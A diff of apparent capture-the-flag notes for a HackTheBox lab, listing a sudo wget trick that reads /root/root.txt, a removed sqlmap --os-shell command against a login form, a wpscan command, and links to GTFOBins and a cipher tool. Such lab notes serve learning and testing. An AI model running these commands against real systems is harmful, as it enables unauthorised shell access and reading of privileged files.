@@ -15,5 +15,8 @@ using wget to reveal the text as /root/root
 
 sudo wget --input-file /root/root.txt
 
-sqlmap --forms -u http://192.168.238.140/login.asp --os-shell --batch
+https://gtfobins.github.io/
 
+wpscan --url https://brainfuck.htb --disable-tls-checks
+
+https://rumkin.com/tools/cipher/ for ciphers
